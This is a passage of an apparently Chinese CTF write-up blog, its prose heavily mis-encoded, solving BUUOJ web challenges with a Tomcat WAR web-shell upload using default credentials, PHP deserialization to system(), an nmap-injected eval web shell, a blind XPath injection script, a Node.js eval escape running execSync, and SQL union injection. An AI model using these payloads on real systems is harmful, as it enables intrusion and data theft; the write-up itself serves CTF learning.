<pre><code>jar cvf exp.war shell.jsp</code></pre><p>ç›´æ¥ä¸Šä¼ ä¼š 404ï¼Œå› ä¸ºè·¯å¾„ä¼šå†æ·»åŠ ä¸€ä¸ª examples</p>
<p>ä¿®æ”¹è·¯å¾„åä¼šå‡ºç° 401ï¼Œå› ä¸ºç¼ºå°‘äº†æˆæƒä¿¡æ¯ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ·»åŠ  Authorization å¤´</p>
<pre><code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code></pre><p>æ·»åŠ åå‡ºç° 403ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬æ¯”æ­£å¸¸è¯·æ±‚å°‘äº†ä¸€ä¸ª cookieï¼Œåœ¨è®¿é—® <code>/manager/html/</code>  æ—¶æˆ‘ä»¬ä¼šè¿”å›ä¸€ä¸ª cookie</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111449.png" alt="image-20200524183538086"></p>
<p>ä½†æ˜¯æ·»åŠ  cookie åæˆ‘ä»¬è¿˜æ˜¯ 403</p>
<p>æ­£ç¡®æ–¹æ³•æŠŠé‚£ä¸ª Set-Cookie çš„è¿”å›åŒ…æŠ“å›æ¥ä¿®æ”¹ Path å°±å¯ä»¥ä¸Šä¼ æˆåŠŸäº†</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111453.png" alt="image-20200524184430042"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111819.png" alt="image-20200524185133827"></p>
<p>å†°èè¿ä¸Šå» flag åœ¨ç¯å¢ƒå˜é‡</p>
<blockquote>
<p>æ ¹ç›®å½•ä¹Ÿæœ‰ /flagggg</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111458.png" alt="image-20200524194151982"></p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>**å‘½ä»¤æ‰§è¡Œé¢˜ç›®</p>
<p>ä¸€è¿›å»å‘ç°ä¼ å‚çš„å‚æ•°æ˜¯</p>
<pre><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code></pre><p>éšæ„ä¿®æ”¹ func å‚æ•°å‘ç°å¦‚ä¸‹æŠ¥é”™</p>
<pre><code>&lt;b&gt;Warning&lt;/b&gt;:  call_user_func() expects parameter 1 to be a valid callback, function &#39;dte&#39; not found or invalid function name in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;</code></pre><p>æ‰€ä»¥è¿™é‡Œå°±æ˜¯å‘½ä»¤æ³¨å…¥äº†ï¼Œè¯•äº†å‡ ä¸ªå‘½ä»¤è¢« waf äº†</p>
<p>å…ˆè¯»ä¸€ä¸‹æºç </p>
<pre><code>func=readfile&amp;p=index.php
&lt;?php
    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
function gettime($func, $p) &#123;
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == &quot;string&quot;) &#123;
        return $result;
    &#125; else &#123;return &quot;&quot;;&#125;
&#125;
class Test &#123;
    var $p = &quot;Y-m-d h:i:s a&quot;;
    var $func = &quot;date&quot;;
    function __destruct() &#123;
        if ($this-&gt;func != &quot;&quot;) &#123;
            echo gettime($this-&gt;func, $this-&gt;p);
        &#125;
    &#125;
&#125;
$func = $_REQUEST[&quot;func&quot;];
$p = $_REQUEST[&quot;p&quot;];

if ($func != null) &#123;
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) &#123;
        echo gettime($func, $p);
    &#125;else &#123;
        die(&quot;Hacker...&quot;);
    &#125;
&#125;
?&gt;</code></pre><p>æ˜¾ç„¶è¿™é‡Œç»™äº†ä¸€ä¸ªååºåˆ—åŒ–çš„æ¼æ´ç»™æˆ‘ä»¬ï¼Œè°ƒç”¨ unserialze å°±å¯ä»¥è§¦å‘æ²¡æœ‰ç»è¿‡è¿‡æ»¤çš„ __destruct å‡½æ•°äº†ï¼Œpayload å¦‚ä¸‹</p>
<blockquote>
<p>ä¸€å¼€å§‹æ‰¾ä¸åˆ° flagï¼Œç›´æ¥ find ä¸€ä¸‹å°±å¥½</p>
</blockquote>
<pre><code>&lt;?php

function send_post($url, $post_data) &#123;
    $postdata = http_build_query($post_data);
    $options = array(
        &#39;http&#39; =&gt; array(
            &#39;method&#39; =&gt; &#39;POST&#39;,
            &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
            &#39;content&#39; =&gt; $postdata,
            &#39;timeout&#39; =&gt; 15 * 60 
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
&#125;

class Test &#123;
    // var $p = &quot;find / | grep flag -s&quot;;
    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;
    var $func = &quot;system&quot;;
&#125;

$a = new Test();
$p = serialize($a);
$func = &quot;unserialize&quot;;

$url = &quot;http://4a1bc0f2-7e1f-4309-ab6d-f72e46bcc64c.node3.buuoj.cn/index.php&quot;;
$post_data = array(
    &#39;func&#39; =&gt; $func ,
    &#39;p&#39; =&gt; $p
);

echo send_post($url, $post_data);
?&gt;</code></pre><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p><strong>nmap è€æ¼æ´</strong></p>
<p>å…ˆæ‰“ä¸€ä¸ª 127.0.0.1 è¯•è¯•ï¼Œå‘ç° nmap å®Œ ip åä¼šå­˜å‚¨åˆ°ä¸€ä¸ª xml æ–‡ä»¶é‡Œé¢ï¼Œç„¶åè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ nmap æœ‰éƒ¨åˆ†æ–‡ä»¶è¯»å†™çš„å‚æ•°</p>
<pre><code># è¯»æ–‡ä»¶ï¼š
TARGET SPECIFICATION:
  -iL &lt;inputfilename&gt;: Input from list of hosts/networks

# å†™æ–‡ä»¶ï¼š
OUTPUT:
  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA &lt;basename&gt;: Output in the three major formats at once</code></pre><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·è¯»æ–‡ä»¶</p>
<pre><code>127.0.0.1&#39; -iL /flag -oN kk.txt &#39;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111511.png" alt="image-20200519162615497"></p>
<p>å½“ç„¶ä½ è¿˜å¯ä»¥ç›´æ¥å†™ shellï¼Œè¿™é‡Œ php è¢«è¿‡æ»¤äº†ï¼Œç¨å¾®ç”¨çŸ­æ ‡ç­¾å’Œ phtml ç»•è¿‡ä¸€ä¸‹</p>
<pre><code>127.0.0.1&#39; &lt;?= @eval($_REQUEST[1]);?&gt; -oG kk.phtml &#39;</code></pre><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><strong>ä»£ç æ³¨å…¥</strong></p>
<p>æŸ¥çœ‹æºç æ¥å£</p>
<pre><code>&lt;p&gt;ç™¾ä¸‡å‰ç«¯çš„NPUæŠ¥æ—¶ä¸­å¿ƒä¸ºæ‚¨æŠ¥æ—¶ï¼š&lt;a href=&quot;./time.php?source&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;?php
#error_reporting(0);
class HelloPhp
&#123;
    public $a;
    public $b;
    public function __construct()&#123;
        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;
        $this-&gt;b = &quot;date&quot;;
    &#125;
    public function __destruct()&#123;
        $a = $this-&gt;a;
        $b = $this-&gt;b;
        echo $b($a);
    &#125;
&#125;
$c = new HelloPhp;

if(isset($_GET[&#39;source&#39;]))
&#123;
    highlight_file(__FILE__);
    die(0);
&#125;

@$ppp = unserialize($_GET[&quot;data&quot;]);</code></pre><p>å¸¸ç”¨çš„å‘½ä»¤å‡½æ•°è¢« ban äº†ï¼Œä½†æ˜¯ assert æ²¡æœ‰ï¼Œç›´æ¥æ„é€ ï¼Œflag åœ¨ phpinfo é‡Œ</p>
<pre><code>?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></pre><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><strong>xpathæ³¨å…¥ + ä»»æ„è¯»æ–‡ä»¶</strong></p>
<p>æŸ¥çœ‹ js æºç å‘ç°åªæœ‰ç™»é™†æˆåŠŸå°±ä¼šè·³åˆ° admin.phpï¼Œè€Œä¸”æäº¤çš„æ•°æ®æ˜¯ç›´æ¥è¿›è¡Œæ‹¼æ¥çš„ï¼ŒçŒœæµ‹è¿™é‡Œæ˜¯ xpath æ³¨å…¥</p>
<pre><code>var data = &quot;&lt;username&gt;&quot;+username+&quot;&lt;/username&gt;&quot;+&quot;&lt;password&gt;&quot;+password+&quot;&lt;/password&gt;&quot;+&quot;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot;; </code></pre><blockquote>
<p>ä¸äº†è§£ xpath å¯ä»¥å…ˆå­¦ä¹ ä¸€ä¸‹</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/xpath/xpath-tutorial.html">https://www.runoob.com/xpath/xpath-tutorial.html</a></p>
<p>xpath æ³¨å…¥å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/11/XPathæ³¨å…¥æŒ‡åŒ—/">https://www.tr0y.wang/2019/05/11/XPathæ³¨å…¥æŒ‡åŒ—/</a></p>
</blockquote>
<p>å…·ä½“æ³¨å…¥è„šæœ¬å¦‚ä¸‹</p>
<pre><code># coding:utf-8
import requests as rq
import re, string

url = &quot;http://f2f86738-985d-4624-abbf-4ddf7606133d.node3.buuoj.cn/&quot;
cookies = &#123;&quot;PHPSESSID&quot;:&quot;478b12d3ea2eb03ae7a71cc867b05c08&quot;&#125;
headers = &#123;&quot;Content-Type&quot;:&quot;application/xml&quot;&#125;
path = &quot;/root/accounts/user[id=2]/password&quot;
number = 0
cnt = 1
length = 0


def get_token():
    res = rq.get(url, cookies=cookies)
    token = re.findall(r&#39;id=&quot;token&quot; value=&quot;(.+?)&quot;&#39;, res.text)[0]
    return token

def get_number():
    index = 1
    while True:
        token = get_token()
        username = &quot;&#39; or count(&#123;&#125;)=&#123;&#125; or &#39;1&quot;.format(path, index)
        payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;
        data = payload.format(username, token)
        res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)
        print(f&quot;[*] index: &#123;index&#125; &#123;res.text&#125;&quot;)
        if &quot;éæ³•æ“ä½œ!&quot; in res.text:
            global number
            number = index
            print(f&quot;[+] number: &#123;index&#125;&quot;)
            break
        else:
            index += 1

def get_length():
    index = 1
    while True:
        token = get_token()
        username = &quot;&#39; or string-length(name(&#123;&#125;/*[&#123;&#125;]))=&#123;&#125; or &#39;1&quot;.format(path, cnt, index)
        payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;
        data = payload.format(username, token)
        res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)
        print(f&quot;[*] index: &#123;index&#125; &#123;res.text&#125;&quot;)
        if &quot;éæ³•æ“ä½œ!&quot; in res.text:
            global length
            length = index
            print(f&quot;[+] length: &#123;index&#125;&quot;)
            break
        else:
            index += 1

def get_name():
    name = &#39;&#39;
    for index in range(1, length + 1): 
        for ch in string.printable:
            token = get_token()
            username = &quot;&#39; or substring(name(&#123;&#125;/*[&#123;&#125;]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39; or &#39;1&quot;.format(path, cnt, index, ch)
            payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;
            data = payload.format(username, token)
            res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)
            print(f&quot;[*] index: &#123;index&#125; ch: &#123;ch&#125; &#123;res.text&#125;&quot;)
            if &quot;éæ³•æ“ä½œ!&quot; in res.text:
                name += ch
                print(f&quot;[+] name: &#123;flag&#125;&quot;)
                break

def get_vaule():
    vaule = &#39;&#39;
    index = 1
    while True:
        for ch in string.printable:
            token = get_token()
            username = &quot;&#39; or substring(&#123;&#125;, &#123;&#125;, 1)=&#39;&#123;&#125;&#39; or &#39;1&quot;.format(path, index, ch)
            payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;
            data = payload.format(username, token)
            res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)
            print(f&quot;[*] index: &#123;index&#125; ch: &#123;ch&#125; &#123;res.text&#125;&quot;)
            if ch == string.printable[-1]:
                print(f&quot;[+] vaule: &#123;vaule&#125;&quot;)
                return
            if &quot;éæ³•æ“ä½œ!&quot; in res.text:
                vaule += ch
                index += 1
                print(f&quot;[+] vaule: &#123;vaule&#125;&quot;)
                break

&#39;&#39;&#39;
&lt;root&gt;
    &lt;accounts&gt;
        &lt;user&gt;
            &lt;id&gt; 1 &lt;/id&gt;
            &lt;username&gt; guest &lt;/id&gt;
            &lt;password&gt; xxxx &lt;/password&gt;
        &lt;/user&gt;
        &lt;user&gt;
            &lt;id&gt; 2 &lt;/id&gt;
            &lt;username&gt; adm1n &lt;/username&gt;
            &lt;password&gt; cf7414b5bdb2e65ee43083f4ddbc4d9f &lt;/password&gt;
        &lt;/user&gt;
    &lt;/accounts&gt;
&lt;/root&gt;
&#39;&#39;&#39;

if __name__ == &quot;__main__&quot;:
    # get_number()
    # get_length()
    # get_name()
    get_vaule()</code></pre><p>æ‹¿å» somd5 ç ´è§£ä¸€ä¸‹å¾—åˆ° admin å¯†ç  <code>adm1n:gtfly123</code> </p>
<p>è¿›å»ä¹‹åæ‹¿åˆ°é¢˜æ˜¯ flag åœ¨ /flagï¼Œä¸€çœ‹ url æ˜¾ç„¶æ˜¯ä¸ªä»»æ„è¯»æ–‡ä»¶ï¼Œ/etc/passwd è¯»å–æˆåŠŸï¼Œè®¿é—® /flag æ˜¾ç¤ºè¿”å›çš„é¡µé¢ä¸­å«æœ‰æ•æ„Ÿå†…å®¹ï¼Œphp å’Œ base è¢« wafï¼Œä½†æ˜¯å¯ä»¥å¤§å°å†™ç»•è¿‡ï¼Œpayload å¦‚ä¸‹</p>
<pre><code>/admin.php?file=pHp://filter/convert.baSe64-encode/resource=/flag</code></pre><h2 id="NPUCTF2020-éªŒè¯ğŸ"><a href="#NPUCTF2020-éªŒè¯ğŸ" class="headerlink" title="[NPUCTF2020]éªŒè¯ğŸ"></a>[NPUCTF2020]éªŒè¯ğŸ</h2><p><strong>node.js</strong></p>
<p>æŸ¥çœ‹æºç </p>
<p>éªŒè¯ç çš„ç¬¬ä¸€ä¸ªé€»è¾‘</p>
<pre><code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code></pre><p>æˆ‘ä»¬å¯ä»¥æ ¹æ® js ä¸­ä»»æ„ç±»å‹ + å­—ç¬¦ä¸² = å­—ç¬¦ä¸²çš„ç‰¹æ€§ç»•è¿‡</p>
<pre><code>&#123;&quot;e&quot;:&quot;1&quot;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125;</code></pre><p>ç„¶åå°±æ˜¯ç»•å‘½ä»¤æ‰§è¡Œ</p>
<p>{â€œeâ€:â€1â€,â€firstâ€:[0],â€secondâ€:â€0â€}</p>
<pre><code>function saferEval(str) &#123;
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;)) &#123;
    return null;
  &#125;
  return eval(str);
&#125;</code></pre><p>è¿™é‡Œæ˜¯ä½¿ç”¨äº† js çš„ç®­å¤´å‡½æ•°è¿›è¡Œç»•è¿‡ï¼Œç„¶åé€šè¿‡ constructor å¯¼å‡º Function å‡½æ•°ï¼Œåˆ©ç”¨ fromCharCode ç¼–å†™ exp</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111709.png" alt="image-20200523230936254"></p>
<p>æœ€åå‚ç…§å®˜æ–¹ payload å†™å‡º</p>
<pre><code>import requests as rq
import re

def gen(cmd):
    s = f&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;&#123;cmd&#125;&#39;).toString()&quot;
    return &#39;,&#39;.join([str(ord(i)) for i in s])

url = &quot;http://b8c28475-b09e-4632-9fc7-cf582bde39f0.node3.buuoj.cn/&quot;
headers = &#123;&quot;Connection&quot;:&quot;close&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125;
cookies = &#123;&quot;PHPSESSION&quot;:&quot;eyJhZG1pbiI6MCwicmVzdWx0cyI6W119&quot;,&quot;PHPSESSION.sig&quot;:&quot;dOk8zRUiKwDaXbIyGNaaZdAmC9k&quot;&#125;

cmd = &quot;cat /flag&quot;
payload = &#39;((Math)=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;&#125;))))(Math+1)()&#39;.format(gen(cmd))

data = &#39;&#123;&quot;e&quot;:&quot;%s&quot;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125;&#39; % (payload)
res = rq.post(url, data=data, cookies=cookies, headers=headers)

flag = re.findall(r&#39;&lt;div id=&quot;res&quot;&gt;([\s\S]+?)&lt;/div&gt;&#39;, res.text)[0].strip()
print(flag)</code></pre><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><strong>å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡» + php7 æ–‡ä»¶åŒ…å«</strong></p>
<p>æºç æç¤ºå¦‚ä¸‹</p>
<pre><code>&lt;!--md5($secret.$name)===$pass --&gt;</code></pre><p>æ˜¯ä¸ªå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»çš„å…¸å‹ä»£ç ï¼Œè¿™é‡Œä¸çŸ¥é“ secret çš„é•¿åº¦ï¼Œæ‰€ä»¥éœ€è¦çˆ†ç ´</p>
<blockquote>
<p>hashpumpy çš„å®‰è£…åœ¨ Windows ä¸Šéœ€è¦  Microsoft Visual C++ 14.0</p>
<p>ä¸æƒ³å®‰è£…çš„æœ‹å‹è¯·ç§»æ­¥ Linux</p>
</blockquote>
<p>çˆ†äº†å¾ˆä¹…å‘ç°æ ¹æœ¬çˆ†ç ´ä¸äº†ï¼ˆx</p>
<p>çœ‹äº†çœ‹åˆ«äººçš„é¢˜è§£æ®è¯´æ˜¯å‡ºé¢˜äººå‡ºé”™äº†ï¼Œå¡«å…¥ name å’Œ passï¼Œç„¶åç”¨ cookie çš„ hash å€¼æ›¿æ¢ä¸€ä¸‹ pass å°±å¯ä»¥äº†ï¼šï¼‰</p>
<pre><code>?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25</code></pre><p>æŠ“åŒ…å‘ç°å®ƒä¼šè·³è½¬åˆ°ä¸€ä¸ª flflflflag.phpï¼Œç„¶åå†è·³è½¬åˆ° 404.htmlï¼Œflflflflag.php å¤„æœ‰ä¸ªæ–‡ä»¶åŒ…å«</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
           window.location.href=&quot;404.html&quot;;
&lt;/script&gt;
&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;
&lt;/head&gt;
&lt;&gt;
&lt;body&gt;
include($_GET[&quot;file&quot;])&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>è¯»ä¸åˆ°å¸¸è§„ flagï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æœ‰ä¸ªåœ°æ–¹ä¸Šä¼ æ–‡ä»¶ï¼Œè¯»ä¸€ä¸‹å®ƒçš„æºç è¿‡æ»¤äº† data|input|zip åè®®</p>
<pre><code>?file=php://filter/convert.base64-encode/resource=flflflflag.php
&lt;html&gt;
&lt;head&gt;
&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
           window.location.href=&quot;404.html&quot;;
&lt;/script&gt;
&lt;title&gt;this_is_not_fl4g_and_Ã¥â€¢ÂºÃ©Â¢â€¢Ã¤ÂºÂº_wants_girlfriend&lt;/title&gt;
&lt;/head&gt;
&lt;&gt;
&lt;body&gt;
&lt;?php
$file=$_GET[&#39;file&#39;];
if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;
    die(&#39;nonono&#39;);
&#125;
@include($file);
echo &#39;include($_GET[&quot;file&quot;])&#39;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p>è¿™é‡Œæ˜¯ä¼šç”¨åˆ°äº† php7 çš„ä¸€ä¸ª bugï¼Œphp åŒ…å«è‡ªèº«å¯¼è‡´æ­»å¾ªç¯çš„æ—¶å€™ï¼ŒåŒæ—¶ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šå¾—åˆ°ä¿å­˜ï¼Œå‚è€ƒå¦‚ä¸‹é“¾æ¥</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfd049924258">https://www.jianshu.com/p/dfd049924258</a></p>
<p>è¿™é‡Œä¸ºäº†é™ä½éš¾åº¦ç»™äº†ä¸€ä¸ª dir.php</p>
<pre><code>&lt;?php
var_dump(scandir(&#39;/tmp&#39;));
?&gt;</code></pre><p>é¡ºä¾¿çœ‹äº†çœ¼åˆ«äººçš„ wpï¼Œflag åœ¨ phpinfoï¼Œæ‰€ä»¥æœ€ç»ˆ payload å¦‚ä¸‹</p>
<pre><code>import requests as rq
from io import BytesIO
import re

url  = &quot;http://3976dcb8-83fd-4f63-9f84-1fb9ab24c6bd.node3.buuoj.cn/&quot;

# upload payload
payload = &quot;&lt;?php phpinfo() ?&gt;&quot;
params = &#123;&quot;file&quot;:&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;&#125;
files = &#123;&#39;file&#39;: BytesIO(payload.encode())&#125;
res1 = rq.post(url + &#39;flflflflag.php&#39;, params=params, files=files)

# find tmpfile
res2 = rq.get(url + &#39;dir.php&#39;)
tmpfile = re.findall(r&#39;&quot;(php[\S]&#123;6&#125;)&quot;&#39;, res2.text)[0]
tmpfile = &#39;/tmp/&#39; + tmpfile

# get flag
params = &#123;&quot;file&quot;:tmpfile&#125;
res3 = rq.get(url + &#39;flflflflag.php&#39;, params=params)
flag = re.findall(r&#39;(flag&#123;.+?&#125;)&#39;, res3.text)[0]
print(flag)</code></pre><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p><strong>å¨±ä¹é¢˜</strong></p>
<p>ä¸€åªå³é”®æºç å’ŒæŸ¥çœ‹ js æ–‡ä»¶å¯ä»¥å‘ç°æœ€åçš„ /fight/ æ¥å£ä¸‹æœ‰å¦‚ä¸‹ js</p>
<pre><code>// Run to scramble original flag
//console.log(scramble(flag, action));
function scramble(flag, key) &#123;
  for (var i = 0; i &lt; key.length; i++) &#123;
    let n = key.charCodeAt(i) % flag.length;
    let temp = flag[i];
    flag[i] = flag[n];
    flag[n] = temp;
  &#125;
  return flag;
&#125;

function check_action() &#123;
  var action = document.getElementById(&quot;action&quot;).value;
  var flag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;];

  // TODO: unscramble function
&#125;</code></pre><p>æºç å«æˆ‘ä»¬çˆ†ç ´ï¼Œé‚£æˆ‘ä»¬å½“ç„¶è¦è‡ªå·±æ‹¼å•¦</p>
<pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></pre><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p><strong>sql æ³¨å…¥</strong></p>
<p>æŸ¥çœ‹ js æºç æ‰¾åˆ°æ¥å£ <code>/query?search=&quot; + query</code></p>
<p>å†çœ‹çœ‹ html æºç ç›²çŒœåå°æ˜¯ <code>select xx from $_GET[&#39;query&#39;]</code></p>
<p>æ³¨å…¥ <code>?search=arabia_terra union select 1,2#</code> å³æœ‰å›æ˜¾</p>
<blockquote>
<p>ä¸æƒ³æ‰‹å·¥çš„å¯ä»¥ç›´æ¥ sqlmap</p>
<p># sqlmap -u â€œ<a target="_blank" rel="noopener" href="http://xxxxx.node3.buuoj.cn/query?search=arabia_terra">http://xxxxx.node3.buuoj.cn/query?search=arabia_terra%20</a>â€œ</p>
</blockquote>
<p>æœ€ç»ˆ payload å¦‚ä¸‹</p>
<pre><code>/query?search=amazonis_planitia UNION SELECT id, code FROM alien_code.code</code></pre><h2 id="b01lers2020-Space-Noodles"><a href="#b01lers2020-Space-Noodles" class="headerlink" title="[b01lers2020]Space Noodles"></a>[b01lers2020]Space Noodles</h2><p><strong>è„‘æ´é¢˜</strong></p>
<blockquote>
<p>å¼€å¤´å…ˆåˆ—ä¸€ä¸‹ HTTP çš„è¯·æ±‚æ–¹æ³•ï¼Œä¸‹é¢ä¼šç”¨åˆ°</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">åºå·</th>
<th align="left">æ–¹æ³•</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">GET</td>
<td align="left">è¯·æ±‚æŒ‡å®šçš„é¡µé¢ä¿¡æ¯ï¼Œå¹¶è¿”å›å®ä½“ä¸»ä½“ã€‚</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">HEAD</td>
<td align="left">ç±»ä¼¼äº GET è¯·æ±‚ï¼Œåªä¸è¿‡è¿”å›çš„å“åº”ä¸­æ²¡æœ‰å…·ä½“çš„å†…å®¹ï¼Œç”¨äºè·å–æŠ¥å¤´</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">POST</td>
<td align="left">å‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POST è¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„å»ºç«‹å’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">PUT</td>
<td align="left">ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€çš„æ•°æ®å–ä»£æŒ‡å®šçš„æ–‡æ¡£çš„å†…å®¹ã€‚</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">DELETE</td>
